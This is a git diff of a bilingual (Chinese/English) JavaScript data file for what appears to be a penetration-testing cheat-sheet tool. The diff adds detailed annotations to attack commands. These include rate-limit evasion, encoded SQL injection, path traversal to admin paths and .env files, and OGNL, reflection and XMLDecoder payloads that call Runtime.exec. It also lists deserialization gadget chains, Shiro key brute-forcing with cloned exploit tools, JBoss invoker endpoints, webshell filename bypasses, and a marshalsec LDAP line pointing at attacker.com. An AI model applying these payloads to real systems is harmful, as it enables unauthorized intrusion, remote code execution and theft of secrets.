-              { part: '# 使用多个API Key\napi_keys = ["key1", "key2", "key3", "key4"]\nfor i, key in enumer', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'api_keys = ["key1", "key2", "key3", "key4"]', explanation: { zh: '准备多把API Key池', en: 'Pool of API keys' }, type: 'value' },
+              { part: 'for i, key in enumerate(api_keys)', explanation: { zh: '轮询使用不同Key分散计数', en: 'Rotate keys across requests' }, type: 'command' },
+              { part: 'headers={"X-API-Key": key}', explanation: { zh: '请求头携带当前Key', en: 'Header carries current key' }, type: 'header' },
+              { part: '注册多个账户获取多个Token', explanation: { zh: '注册多账户扩充Key池', en: 'Register accounts for more tokens' }, type: 'concept' },
             ],
         description: { zh: 'API Key轮换', en: 'API key rotation' }, 
         platform: 'all'
@@ -8722,9 +8848,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '请求分散', en: 'Request distribution' }, 
         command: '# 添加延迟\nimport time\nfor i in range(100):\n    requests.get("http://target.com/api/test")\n    time.sleep(0.5)  # 每次请求头隔0.5秒\n\n# 分散到不同时间段\n# 使用定时任务分散请求',
             syntaxBreakdown: [
-              { part: '# 添加延迟\nimport time\nfor i in range(100):\n    requests.get("http://target.com/api/test")\n    time.', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' },
-              { part: 'sleep', explanation: { zh: 'SQL关键字', en: 'SQLCriticalCharacter' }, type: 'keyword' },
-              { part: '(0.5)  # 每次请求头隔0.5秒\n\n# 分散到不同时间段\n# 使用定时任务分散请求', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' }
+              { part: 'for i in range(100)', explanation: { zh: '循环发送100次请求', en: 'Send 100 requests' }, type: 'command' },
+              { part: 'time.sleep(0.5)', explanation: { zh: '每次请求间隔0.5秒，低于限速阈值', en: '0.5s interval under rate limit' }, type: 'command' },
+              { part: '分散到不同时间段', explanation: { zh: '时间维度分散避开窗口计数', en: 'Spread across time windows' }, type: 'technique' },
+              { part: '使用定时任务分散请求', explanation: { zh: '定时任务进一步均匀分布', en: 'Cron-based distribution' }, type: 'technique' },
             ],
         description: { zh: '请求分散', en: 'Request distribution' }, 
         platform: 'all'
@@ -8784,7 +8911,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '字段变体', en: 'fieldVariant' }, 
         command: '# 尝试不同字段名\nis_admin, is_Admin, IS_ADMIN\nadmin, Admin, ADMIN\nuser_type, userType, user_type_id\n\n# 尝试内部字段\n__v, _id, created_at, updated_at\npassword_hash, passwordHash',
             syntaxBreakdown: [
-              { part: '# 尝试不同字段名\nis_admin, is_Admin, IS_ADMIN\nadmin, Admin, ADMIN\nuser_type, userTyp', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'is_admin, is_Admin, IS_ADMIN', explanation: { zh: '权限字段的大小写命名变体', en: 'Case variants of privilege field' }, type: 'value' },
+              { part: 'user_type, userType, user_type_id', explanation: { zh: '用户类型字段的命名变体', en: 'Naming variants of user_type' }, type: 'value' },
+              { part: '__v, _id, created_at, updated_at', explanation: { zh: '框架内部字段试探(MongoDB等)', en: 'Framework internal fields' }, type: 'value' },
+              { part: 'password_hash, passwordHash', explanation: { zh: '口令哈希字段命名变体', en: 'Password hash field variants' }, type: 'value' },
             ],
         description: { zh: '尝试字段变体', en: 'AttemptfieldVariant' }, 
         platform: 'all'
@@ -8793,8 +8923,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '类型混淆', en: 'TypeObfuscation' }, 
         command: '# 数字转布尔\n{"isAdmin": 1}\n{"isAdmin": "true"}\n\n# 数组转字符串\n{"roles": "admin"}\n\n# 对象转数组\n{"settings": ["admin"]}',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 数字转布尔\n{"isAdmin": 1}\n{"isAdmin": "true"}\n\n# 数组转字符串\n{"roles": "admin"}\n\n# 对象转数组\n{"settings": ["admin"]}', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '{"isAdmin": 1}', explanation: { zh: '数字1被弱类型判真', en: 'Numeric 1 truthy' }, type: 'json' },
+              { part: '{"isAdmin": "true"}', explanation: { zh: '字符串"true"被弱类型判真', en: 'String "true" truthy' }, type: 'json' },
+              { part: '{"roles": "admin"}', explanation: { zh: '数组字段传字符串突破校验', en: 'String for array field' }, type: 'json' },
+              { part: '{"settings": ["admin"]}', explanation: { zh: '对象字段传数组突破校验', en: 'Array for object field' }, type: 'json' },
             ],
         description: { zh: '类型混淆测试', en: 'TypeObfuscationTest' }, 
         platform: 'all'
@@ -8862,8 +8994,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '路径遍历', en: 'PathTraverse' }, 
         command: '# 路径遍历访问\nGET /api/users/../admin\nGET /api/users/..%2Fadmin\n\n# 编码绕过\nGET /api/users/%2e%2e/admin\nGET /api/users/..%c0%afadmin',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 路径遍历访问\nGET /api/users/../admin\nGET /api/users/..%2Fadmin\n\n# 编码绕过\nGET /api/users/%2e%2e/admin\nGET /api/users/..%c0%afadmin', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'GET /api/users/../admin', explanation: { zh: '路径遍历访问admin资源', en: 'Traverse to admin resource' }, type: 'method' },
+              { part: '..%2Fadmin', explanation: { zh: '编码斜杠的遍历变体', en: 'Encoded slash traversal' }, type: 'encoding' },
+              { part: '%2e%2e/admin', explanation: { zh: '编码点号的遍历变体', en: 'Encoded dot traversal' }, type: 'encoding' },
+              { part: '..%c0%afadmin', explanation: { zh: '过长编码的遍历变体', en: 'Overlong encoding traversal' }, type: 'encoding' },
             ],
         description: { zh: '路径遍历绕过', en: 'PathTraverseBypass' }, 
         platform: 'all'
@@ -8872,8 +9006,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '参数篡改', en: 'ParameterTampering' }, 
         command: '# 修改请求方法\n# GET变POST\nPOST /api/documents/doc_123\n\n# 添加参数\nGET /api/documents/doc_123?user_id=attacker\n\n# 修改Content-Type\nContent-Type: application/xml\n<document><id>doc_123</id></document>',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 修改请求方法\n# GET变POST\nPOST /api/documents/doc_123\n\n# 添加参数\nGET /api/documents/doc_123?user_id=attacker\n\n# 修改Content-Type\nContent-Type: application/xml\n<document><id>doc_123</id></document>', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'POST /api/documents/doc_123', explanation: { zh: 'GET改POST尝试未授权写操作', en: 'GET to POST method switch' }, type: 'method' },
+              { part: '?user_id=attacker', explanation: { zh: '附加参数改对象归属', en: 'Parameter changes ownership' }, type: 'parameter' },
+              { part: 'Content-Type: application/xml', explanation: { zh: '改用XML提交', en: 'Switch to XML content type' }, type: 'header' },
+              { part: '<document><id>doc_123</id></document>', explanation: { zh: 'XML体携带目标对象ID', en: 'XML body with object id' }, type: 'value' },
             ],
         description: { zh: '参数篡改绕过', en: 'ParameterTamperingBypass' }, 
         platform: 'all'
@@ -8943,8 +9079,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         command: '# URL编码\nGET /api/users?id=1%20OR%201%3D1\n\n# Unicode编码\nGET /api/users?id=1%u0020OR%u00201%3D1\n\n# 双重编码\nGET /api/users?id=1%2520OR%25201%253D1',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' URL编码\nGET /api/users?id=1%20OR%201%3D1\n\n# Unicode编码\nGET /api/users?id=1%u0020OR%u00201%3D1\n\n# 双重编码\nGET /api/users?id=1%2520OR%25201%253D1', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'id=1%20OR%201%3D1', explanation: { zh: '空格与等号的URL编码注入', en: 'URL-encoded injection' }, type: 'encoding' },
+              { part: 'id=1%u0020OR%u00201%3D1', explanation: { zh: 'Unicode编码注入变体', en: 'Unicode-encoded variant' }, type: 'encoding' },
+              { part: 'id=1%2520OR%25201%253D1', explanation: { zh: '双重编码注入变体', en: 'Double-encoded variant' }, type: 'encoding' },
             ],
         description: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         platform: 'all'
@@ -8953,13 +9090,11 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: 'Content-Type绕过', en: 'Content-TypeBypass' }, 
         command: '# 切换Content-Type\nContent-Type: application/xml\n<user><id>1 OR 1=1</id></user>\n\nContent-Type: application/x-www-form-urlencoded\nid=1+OR+1=1\n\n# JSON数组\n{"id": ["1", "OR", "1=1"]}',
             syntaxBreakdown: [
-              { part: '# 切换Content-Type\nContent-Type: application/xml\n<user><id>1 ', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' },
-              { part: 'OR', explanation: { zh: 'SQL关键字', en: 'SQLCriticalCharacter' }, type: 'keyword' },
-              { part: ' 1=1</id></user>\n\nContent-Type: application/x-www-form-urlencoded\nid=1+', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' },
-              { part: 'OR', explanation: { zh: 'SQL关键字', en: 'SQLCriticalCharacter' }, type: 'keyword' },
-              { part: '+1=1\n\n# JSON数组\n{"id": ["1", "', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' },
-              { part: 'OR', explanation: { zh: 'SQL关键字', en: 'SQLCriticalCharacter' }, type: 'keyword' },
-              { part: '", "1=1"]}', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' }
+              { part: 'Content-Type: application/xml', explanation: { zh: 'XML提交绕过针对表单的过滤', en: 'XML bypasses form filtering' }, type: 'header' },
+              { part: '<user><id>1 OR 1=1</id></user>', explanation: { zh: 'XML元素中的注入语句', en: 'Injection inside XML element' }, type: 'value' },
+              { part: 'Content-Type: application/x-www-form-urlencoded', explanation: { zh: '表单编码提交', en: 'Form-encoded submission' }, type: 'header' },
+              { part: 'id=1+OR+1=1', explanation: { zh: '+号替代空格的表单注入', en: 'Plus-encoded injection' }, type: 'value' },
+              { part: '{"id": ["1", "OR", "1=1"]}', explanation: { zh: 'JSON数组绕过参数化查询', en: 'JSON array bypasses prepared statement' }, type: 'json' },
             ],
         description: { zh: 'Content-Type绕过', en: 'Content-TypeBypass' }, 
         platform: 'all'
@@ -9098,8 +9233,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         command: '# URL编码绕过\n..%252f = ..%2f = ../\n\n# 双重URL编码\n..%252f..%252f',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' URL编码绕过\n..%252f = ..%2f = ../\n\n# 双重URL编码\n..%252f..%252f', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '..%252f', explanation: { zh: '双重编码的../：两次解码后还原目录回溯', en: 'Double-encoded parent traversal' }, type: 'encoding' },
+              { part: '..%2f = ..%2f = ../', explanation: { zh: '服务端多次解码时各形式等价', en: 'Equivalent after multi-decode' }, type: 'encoding' },
+              { part: '..%252f..%252f', explanation: { zh: '双重编码回溯叠加', en: 'Stacked double-encoded traversal' }, type: 'encoding' },
             ],
         description: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         platform: 'all'
@@ -9166,8 +9302,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         command: '# URL编码\n%{#cmd} = %25%7b%23cmd%7d\n\n# Unicode编码\n\\u0025{#cmd}\n\n# 双重编码\n%2525%257b%2523cmd%257d',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' URL编码\n%{#cmd} = %25%7b%23cmd%7d\n\n# Unicode编码\n\\\u0025{#cmd}\n\n# 双重编码\n%2525%257b%2523cmd%257d', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '%25%7b%23cmd%7d', explanation: { zh: '%{#cmd}的单次URL编码形式', en: 'Single-encoded OGNL expression' }, type: 'encoding' },
+              { part: '\\u0025{#cmd}', explanation: { zh: '%的Unicode转义变体', en: 'Unicode-escaped percent variant' }, type: 'encoding' },
+              { part: '%2525%257b%2523cmd%257d', explanation: { zh: '双重编码变体', en: 'Double-encoded variant' }, type: 'encoding' },
             ],
         description: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         platform: 'all'
@@ -9176,7 +9313,11 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '表达式变体', en: 'tableexpressionVariant' }, 
         command: '# 不同表达式语法\n${...}\n%{...}\n#{...}\n@{...}\n\n# 使用静态方法\n@java.lang.Runtime@getRuntime()\nnew java.lang.ProcessBuilder()',
             syntaxBreakdown: [
-              { part: '# 不同表达式语法\n${...}\n%{...}\n#{...}\n@{...}\n\n# 使用静态方法\n@java', explanation: { zh: '模板表达式注入', en: 'TemplatetableexpressionInjection' }, type: 'value' }
+              { part: '${...}', explanation: { zh: 'EL表达式定界符', en: 'EL expression syntax' }, type: 'value' },
+              { part: '%{...}', explanation: { zh: 'OGNL表达式定界符(Struts2)', en: 'OGNL expression syntax' }, type: 'value' },
+              { part: '#{...}', explanation: { zh: '另一类表达式定界符', en: 'Alternate expression syntax' }, type: 'value' },
+              { part: '@java.lang.Runtime@getRuntime()', explanation: { zh: 'OGNL静态方法调用执行系统命令', en: 'OGNL static method invocation' }, type: 'function' },
+              { part: 'new java.lang.ProcessBuilder()', explanation: { zh: 'ProcessBuilder构造执行命令', en: 'ProcessBuilder execution' }, type: 'function' },
             ],
         description: { zh: '表达式变体绕过', en: 'tableexpressionVariantBypass' }, 
         platform: 'all'
@@ -9249,8 +9390,11 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '反射绕过', en: 'ReflectionBypass' }, 
         command: '# 使用反射调用\n#cls=@java.lang.Class@forName("java.lang.Runtime")\n#method=#cls.getMethod("getRuntime")\n#rt=#method.invoke(null)\n#exec=#cls.getMethod("exec",@java.lang.String@class)\n#exec.invoke(#rt,"id")',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 使用反射调用\n#cls=@java.lang.Class@forName("java.lang.Runtime")\n#method=#cls.getMethod("getRuntime")\n#rt=#method.invoke(null)\n#exec=#cls.getMethod("exec",@java.lang.String@class)\n#exec.invoke(#rt,"id")', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '#cls=@java.lang.Class@forName("java.lang.Runtime")', explanation: { zh: '反射加载Runtime类', en: 'Load Runtime via reflection' }, type: 'command' },
+              { part: '#method=#cls.getMethod("getRuntime")', explanation: { zh: '获取getRuntime方法对象', en: 'Get getRuntime Method' }, type: 'command' },
+              { part: '#rt=#method.invoke(null)', explanation: { zh: '调用获取Runtime实例', en: 'Obtain Runtime instance' }, type: 'command' },
+              { part: '#exec=#cls.getMethod("exec",@java.lang.String@class)', explanation: { zh: '定位exec(String)重载方法', en: 'Locate exec(String) overload' }, type: 'command' },
+              { part: '#exec.invoke(#rt,"id")', explanation: { zh: '反射调用exec执行id命令', en: 'Invoke exec with id command' }, type: 'command' },
             ],
         description: { zh: '反射绕过', en: 'ReflectionBypass' }, 
         platform: 'all'
@@ -9310,8 +9454,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '路径编码绕过', en: 'PathEncoding Bypass' }, 
         command: '# 不同编码方式\n/console/css/..;/console.portal\n/console/css/%2e%2e/console.portal\n/console/css/%252e%252e/console.portal\n/console/css/..%252fconsole.portal',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 不同编码方式\n/console/css/..;/console.portal\n/console/css/%2e%2e/console.portal\n/console/css/%252e%252e/console.portal\n/console/css/..%252fconsole.portal', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '/console/css/..;/console.portal', explanation: { zh: '分号绕过路径规范化直达console.portal', en: 'Semicolon bypasses path normalization' }, type: 'path' },
+              { part: '%2e%2e', explanation: { zh: 'URL编码的..回溯', en: 'Encoded parent directory' }, type: 'encoding' },
+              { part: '%252e%252e', explanation: { zh: '双重编码的..变体', en: 'Double-encoded parent directory' }, type: 'encoding' },
+              { part: '..%252f', explanation: { zh: '编码的../变体', en: 'Encoded traversal slash' }, type: 'encoding' },
             ],
         description: { zh: '路径编码绕过', en: 'PathEncoding Bypass' }, 
         platform: 'all'
@@ -9320,7 +9466,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: 'XML变体', en: 'XMLVariant' }, 
         command: '# 使用不同XML标签\n<void class="java.lang.Runtime" method="getRuntime">\n<void method="exec">\n<string>id</string>\n</void>\n</void>\n\n# 使用数组形式\n<array class="java.lang.String" length="1">\n<void index="0"><string>id</string></void>\n</array>',
             syntaxBreakdown: [
-              { part: '# 使用不同XML标签\n<void class="java.lang.Runtime" method="getRuntime">\n<void method=', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '<void class="java.lang.Runtime" method="getRuntime">', explanation: { zh: 'XMLDecoder以静态方法形式获取Runtime', en: 'XMLDecoder invokes static method' }, type: 'tag' },
+              { part: '<void method="exec">', explanation: { zh: '调用exec执行命令', en: 'Invoke exec' }, type: 'tag' },
+              { part: '<string>id</string>', explanation: { zh: '字符串参数即要执行的命令', en: 'String argument is the command' }, type: 'value' },
+              { part: '<array class="java.lang.String" length="1">', explanation: { zh: '数组形式传参的变体结构', en: 'Array-form argument variant' }, type: 'tag' },
             ],
         description: { zh: 'XML变体绕过', en: 'XMLVariantBypass' }, 
         platform: 'all'
@@ -9369,8 +9518,12 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: 'Gadget链选择', en: 'Gadget chain selection' }, 
         command: '# 不同Gadget链\nCommonsCollections1\nCommonsCollections2\nCommonsCollections3\nCommonsCollections4\nCommonsBeanutils1\nJdk7u21\nJre8u20\n\n# 根据目标环境选择合适的链',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 不同Gadget链\nCommonsCollections1\nCommonsCollections2\nCommonsCollections3\nCommonsCollections4\nCommonsBeanutils1\nJdk7u21\nJre8u20\n\n# 根据目标环境选择合适的链', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'CommonsCollections1', explanation: { zh: 'CC1链：Transformer反射链', en: 'CC1 gadget chain' }, type: 'concept' },
+              { part: 'CommonsCollections2', explanation: { zh: 'CC2链：PriorityQueue触发', en: 'CC2 gadget chain' }, type: 'concept' },
+              { part: 'CommonsBeanutils1', explanation: { zh: 'BeanUtils比较器触发链', en: 'BeanUtils gadget chain' }, type: 'concept' },
+              { part: 'Jdk7u21', explanation: { zh: 'JDK7原生链', en: 'JDK7 native chain' }, type: 'concept' },
+              { part: 'Jre8u20', explanation: { zh: 'JRE8原生链变体', en: 'JRE8 native chain' }, type: 'concept' },
+              { part: '根据目标环境选择合适的链', explanation: { zh: '按目标classpath选择可用链', en: 'Choose per target classpath' }, type: 'concept' },
             ],
         description: { zh: 'Gadget链选择', en: 'Gadget chain selection' }, 
         platform: 'all'
@@ -9500,8 +9653,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         command: '# URL编码\n?s=%2fIndex%2f%5cthink%5capp%2finvokefunction\n\n# 大小写混合\n?s=/Index/\\Think\\App/invokefunction\n\n# 双重编码\n?s=%252fIndex%252f%255cthink%255capp%252finvokefunction',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' URL编码\n?s=%2fIndex%2f%5cthink%5capp%2finvokefunction\n\n# 大小写混合\n?s=/Index/\\Think\\App/invokefunction\n\n# 双重编码\n?s=%252fIndex%252f%255cthink%255capp%252finvokefunction', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '?s=%2fIndex%2f%5cthink%5capp%2finvokefunction', explanation: { zh: 'invokefunction路径的URL编码形式', en: 'URL-encoded invoke path' }, type: 'encoding' },
+              { part: '\\Think\\App', explanation: { zh: '命名空间大小写混合绕过', en: 'Mixed-case namespace bypass' }, type: 'encoding' },
+              { part: '?s=%252fIndex%252f%255cthink%255capp%252finvokefunction', explanation: { zh: '双重编码变体', en: 'Double-encoded variant' }, type: 'encoding' },
             ],
         description: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         platform: 'all'
@@ -9510,8 +9664,12 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '路径变体', en: 'PathVariant' }, 
         command: '# 不同路径格式\n?s=/index/think\\app/invokefunction\n?s=index/think/app/invokefunction\n?s=/index/\\think\\App/invokefunction\n\n# 使用不同入口点\n/index.php?s=...\n/?s=...\n/public/index.php?s=...',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 不同路径格式\n?s=/index/think\\app/invokefunction\n?s=index/think/app/invokefunction\n?s=/index/\\think\\App/invokefunction\n\n# 使用不同入口点\n/index.php?s=...\n/?s=...\n/public/index.php?s=...', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '?s=/index/think\\app/invokefunction', explanation: { zh: '小写命名空间形式', en: 'Lowercase namespace form' }, type: 'path' },
+              { part: '?s=index/think/app/invokefunction', explanation: { zh: '无前导斜杠的正斜杠形式', en: 'No leading slash variant' }, type: 'path' },
+              { part: '?s=/index/\\think\\App/invokefunction', explanation: { zh: '混合大小写反斜杠形式', en: 'Mixed-case backslash form' }, type: 'path' },
+              { part: '/index.php?s=...', explanation: { zh: '显式入口文件index.php', en: 'Explicit index.php entry' }, type: 'path' },
+              { part: '/?s=...', explanation: { zh: '根路径入口', en: 'Root path entry' }, type: 'path' },
+              { part: '/public/index.php?s=...', explanation: { zh: 'public目录入口变体', en: 'Public directory entry' }, type: 'path' },
             ],
         description: { zh: '路径变体绕过', en: 'PathVariantBypass' }, 
         platform: 'all'
@@ -9572,8 +9730,12 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '路径绕过', en: 'PathBypass' }, 
         command: '# 尝试不同路径\n/.env\n/.env.example\n/.env.local\n/.env.production\n/../.env\n/..%2f.env\n/..%252f.env',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 尝试不同路径\n/.env\n/.env.example\n/.env.local\n/.env.production\n/../.env\n/..%2f.env\n/..%252f.env', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '/.env', explanation: { zh: '标准环境变量文件', en: 'Standard env file' }, type: 'path' },
+              { part: '/.env.example', explanation: { zh: '示例文件：暴露配置项结构', en: 'Example file reveals structure' }, type: 'path' },
+              { part: '/.env.local', explanation: { zh: '本地环境变体', en: 'Local env variant' }, type: 'path' },
+              { part: '/.env.production', explanation: { zh: '生产环境变体', en: 'Production env variant' }, type: 'path' },
+              { part: '/..%2f.env', explanation: { zh: '编码回溯变体', en: 'Encoded traversal variant' }, type: 'path' },
+              { part: '/..%252f.env', explanation: { zh: '双重编码回溯变体', en: 'Double-encoded traversal variant' }, type: 'path' },
             ],
         description: { zh: '路径绕过', en: 'PathBypass' }, 
         platform: 'all'
@@ -9638,8 +9800,11 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: 'Gadget链选择', en: 'Gadget chain selection' }, 
         command: '# 不同Gadget链\nCommonsCollections2\nCommonsBeanutils1\nJdk7u21\nJRMPClient\n\n# 根据目标环境选择\n# 某些链可能被过滤',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 不同Gadget链\nCommonsCollections2\nCommonsBeanutils1\nJdk7u21\nJRMPClient\n\n# 根据目标环境选择\n# 某些链可能被过滤', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'CommonsCollections2', explanation: { zh: 'CC2链：适配较多版本', en: 'CC2 gadget chain' }, type: 'concept' },
+              { part: 'CommonsBeanutils1', explanation: { zh: 'BeanUtils链：Shiro依赖自带', en: 'BeanUtils chain bundled with Shiro' }, type: 'concept' },
+              { part: 'JRMPClient', explanation: { zh: 'JRMP客户端链：配合远程恶意RMI', en: 'JRMP client chain' }, type: 'concept' },
+              { part: 'Jdk7u21', explanation: { zh: 'JDK7原生链', en: 'JDK7 native chain' }, type: 'concept' },
+              { part: '某些链可能被过滤', explanation: { zh: '按目标防护情况轮换尝试', en: 'Rotate chains as filters allow' }, type: 'concept' },
             ],
         description: { zh: 'Gadget链选择', en: 'Gadget chain selection' }, 
         platform: 'all'
@@ -9648,7 +9813,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '密钥爆破', en: 'keyBrute force' }, 
         command: '# 使用工具爆破密钥\ngit clone https://github.com/insightglacier/Shiro_exploit\npython3 shiro_exploit.py -t http://target -f keys.txt\n\n# 或使用ShiroScan\njava -jar shiro_scan.jar -t http://target -f keys.txt',
             syntaxBreakdown: [
-              { part: '# 使用工具爆破密钥\ngit clone https://github.com/insightglacier/Shiro_exploit\npython3 s', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'git clone https://github.com/insightglacier/Shiro_exploit', explanation: { zh: '获取Shiro密钥爆破工具', en: 'Get Shiro exploit tool' }, type: 'command' },
+              { part: 'python3 shiro_exploit.py -t http://target -f keys.txt', explanation: { zh: '对目标用密钥字典爆破', en: 'Brute-force key from wordlist' }, type: 'command' },
+              { part: 'java -jar shiro_scan.jar -t http://target -f keys.txt', explanation: { zh: 'ShiroScan替代工具', en: 'ShiroScan alternative' }, type: 'command' },
             ],
         description: { zh: '密钥爆破', en: 'keyBrute force' }, 
         platform: 'all'
@@ -9708,8 +9875,11 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '端点变体', en: 'EndpointVariant' }, 
         command: '# 不同端点\n/invoker/JMXInvokerServlet\n/invoker/EJBInvokerServlet\n/invoker/readonly/JMXInvokerServlet\n/jmx-console/\n/web-console/',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 不同端点\n/invoker/JMXInvokerServlet\n/invoker/EJBInvokerServlet\n/invoker/readonly/JMXInvokerServlet\n/jmx-console/\n/web-console/', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '/invoker/JMXInvokerServlet', explanation: { zh: 'JMX反序列化端点', en: 'JMX deserialization endpoint' }, type: 'path' },
+              { part: '/invoker/EJBInvokerServlet', explanation: { zh: 'EJB反序列化端点', en: 'EJB deserialization endpoint' }, type: 'path' },
+              { part: '/invoker/readonly/JMXInvokerServlet', explanation: { zh: '只读JMX变体端点', en: 'Readonly JMX endpoint' }, type: 'path' },
+              { part: '/jmx-console/', explanation: { zh: 'JMX控制台', en: 'JMX console' }, type: 'path' },
+              { part: '/web-console/', explanation: { zh: 'Web控制台', en: 'Web console' }, type: 'path' },
             ],
         description: { zh: '端点变体', en: 'EndpointVariant' }, 
         platform: 'all'
@@ -9779,8 +9949,11 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '文件名绕过', en: 'FilenameBypass' }, 
         command: '# 不同文件名变体\nshell.jsp%20\nshell.jsp::$DATA\nshell.jsp/\nshell.jsp%00\nshell.jSp\nshell.jsP',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 不同文件名变体\nshell.jsp%20\nshell.jsp::$DATA\nshell.jsp/\nshell.jsp%00\nshell.jSp\nshell.jsP', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
